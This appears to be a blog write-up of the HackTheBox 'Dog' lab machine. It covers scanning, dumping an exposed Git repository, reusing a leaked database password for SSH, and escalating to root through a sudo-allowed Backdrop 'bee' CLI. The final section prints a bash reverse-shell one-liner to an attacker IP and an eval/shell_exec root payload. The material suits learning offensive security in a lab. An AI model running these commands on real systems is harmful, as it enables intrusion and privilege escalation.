---
title: Dog HackTheBox
date: 09-03-2025
slug: "dog-hackthebox"
# permalink: /posts/underpass-hackthebox/

layout: post
categories: [Hack The Box]
tags: [writeups, hackthebox, easy, linux, ctf]
image: 
    path: /assets/img/sample/dog/Dog.jpg
    alt: Dog Machine HackTheBox
---

## Intruduction

Hello guys, welcome back to my blog. Today's, we will discover the Dog challenge on HackTheBox. This challenge that focuses on penetration testing skills. This challenge include skills like enumeration, git,... Etc

## Enumeration

Add dog.htb into /etc/host file.


First, scan port with `nmap` tool.

~~~ shell
┌──(trit㉿chimp)-[~]
└─$ nmap -A 10.10.11.58 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-08 18:11 EST
Nmap scan report for 10.10.11.58
Host is up (0.17s latency).
Not shown: 964 closed tcp ports (reset), 34 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | Dog
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Then Directory Enumeration with `gobuster` tool.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Dog]
└─$ gobuster dir -u 10.10.11.58 -w /usr/share/wordlists/dirb/common.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.58
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.git/HEAD            (Status: 200) [Size: 23]
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/core                 (Status: 301) [Size: 309] [--> http://10.10.11.58/core/]
/files                (Status: 301) [Size: 310] [--> http://10.10.11.58/files/]
/index.php            (Status: 200) [Size: 13332]
/layouts              (Status: 301) [Size: 312] [--> http://10.10.11.58/layouts/]
/modules              (Status: 301) [Size: 312] [--> http://10.10.11.58/modules/]
/robots.txt           (Status: 200) [Size: 1198]
/server-status        (Status: 403) [Size: 276]
/sites                (Status: 301) [Size: 310] [--> http://10.10.11.58/sites/]
/themes               (Status: 301) [Size: 311] [--> http://10.10.11.58/themes/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
~~~

Next, I used tool `git-dumper` extract the entire Git repository from a website if the .git/ directory is public.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Dog]
└─$ git-dumper http://dog.htb/.git .
~~~

> You can prefer database-configuration [here](https://docs.backdropcms.org/documentation/database-configuration).
{: .prompt-info }

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Dog]
└─$ cat settings.php| grep "database" 
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
 * of the serialized database credentials will be used as a fallback salt.
 * with any backups of your Backdrop files and database.
 * the database is inactive due to an error. It can be set through the
 * database changes are necessary. Modifying values within complicated objects
 * Typically used to specify a different database connection information, to
$database_charset = 'utf8mb4';
~~~

I found the password, but don't have the username, so I used `theHarvester` tool find all user name in web server.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Dog]
└─$ theHarvester -d dog.htb -b all
~~~

I have three username.

~~~ 
'@dog.htb                                                                                                                                                    
johncusack@dog.htb                                                                          	                                                                 
tiffany@dog.htb
~~~

## Get User Flag

Try connect `ssh` with each username, and I have the user flag, quite easy.

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Dog]
└─$ ssh johncusack@10.10.11.58
-bash-5.0$ ls
user.txt
-bash-5.0$ cat user.txt
~~~

## Get Root Flag
This line shows that user **johncusack** can run /usr/local/bin/bee with ALL : ALL privileges, which means it can run as root without entering a password.
~~~ shell 

┌──(trit㉿chimp)-[~/HackTheBox/Dog]
└─$ ssh johncusack@10.10.11.58
-bash-5.0$ sudo -l
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
~~~

This code below is a PHP CLI script (#!/usr/bin/env php) designed to run Backdrop CMS related commands. It executes commands from the command line by calling a series of functions:
~~~
bee_initialize_server();
bee_parse_input();
bee_initialize_console();
bee_process_command();
bee_print_messages();
bee_display_output();
~~~

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Dog]
└─$ ssh johncusack@10.10.11.58

-bash-5.0$ cat /usr/local/bin/bee
#!/usr/bin/env php
<?php
/**
 * @file
 * A command line utility for Backdrop CMS.
 */

// Exit gracefully with a meaningful message if installed within a web
// accessible location and accessed in the browser.
if (!bee_is_cli()) {
  echo bee_browser_load_html();
  die();
}

// Set custom error handler.
set_error_handler('bee_error_handler');

// Include files.
require_once __DIR__ . '/includes/miscellaneous.inc';
require_once __DIR__ . '/includes/command.inc';
require_once __DIR__ . '/includes/render.inc';
require_once __DIR__ . '/includes/filesystem.inc';
require_once __DIR__ . '/includes/input.inc';
require_once __DIR__ . '/includes/globals.inc';

// Main execution code.
bee_initialize_server();
bee_parse_input();
bee_initialize_console();
bee_process_command();
bee_print_messages();
bee_display_output();
exit();

/**
 * Custom error handler for `bee`.
 *
 * @param int $error_level
 *   The level of the error.
 * @param string $message
 *   Error message to output to the user.
 * @param string $filename
 *   The file that the error came from.
 * @param int $line
 *   The line number the error came from.
 * @param array $context
 *   An array of all variables from where the error was triggered.
 *
 * @see https://www.php.net/manual/en/function.set-error-handler.php
 * @see _backdrop_error_handler()
 */
function bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) {
  require_once __DIR__ . '/includes/errors.inc';
  _bee_error_handler_real($error_level, $message, $filename, $line, $context);
}

/**
 * Detects whether the current script is running in a command-line environment.
 */
function bee_is_cli() {
  return (empty($_SERVER['SERVER_SOFTWARE']) && (php_sapi_name() == 'cli' || (is_numeric($_SERVER['argc']) && $_SERVER['argc'] > 0)));
}

/**
 * Return the HTML to display if this page is loaded in the browser.
 *
 * @return string
 *   The concatentated html to display.
 */
function bee_browser_load_html() {
  // Set the title to use in h1 and title elements.
  $title = "Bee Gone!";
  // Place a white block over "#!/usr/bin/env php" as this is output before
  // anything else.
  $browser_output = "<div style='background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;'>&nbsp;</div>";
  // Add the bee logo and style appropriately.
  $browser_output .= "<img src='./images/bee.png' align='right' width='150' height='157' style='max-width:100%;margin-top:3rem;'>";
  // Add meaningful text.
  $browser_output .= "<h1 style='font-family:Tahoma;'>$title</h1>";
  $browser_output .= "<p style='font-family:Verdana;'>Bee is a command line tool only and will not work in the browser.</p>";
  // Add the document title using javascript when the window loads.
  $browser_output .= "<script>window.onload = function(){document.title='$title';}</script>";
  // Output the combined string.
  return $browser_output;
}
~~~




### Method one to get the root flag

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Dog]
└─$ ssh johncusack@10.10.11.58
-bash-5.0$ sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cat /root/root.txt');"
~~~


### Method two to get the root flag

On ssh server, I excuted the command:
~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Dog]
└─$ ssh johncusack@10.10.11.58
-bash-5.0$ sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash -c \"bash -i >& /dev/tcp/10.10.X.X/4444 0>&1\"');"
~~~
> Notice 10.10.X.X is IP address attack machine
{: .prompt-warning  }


Another command listen 

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Dog]
└─$ nc -lnvp 4444       
listening on [any] 4444 ...

root@dog:/var/www/html# cat /root/root.txt
cat /root/root.txt
root@dog:/var/www/html# 
~~~~

***Thank you for readling this far! I hope this writeup helps you in your learning and research.***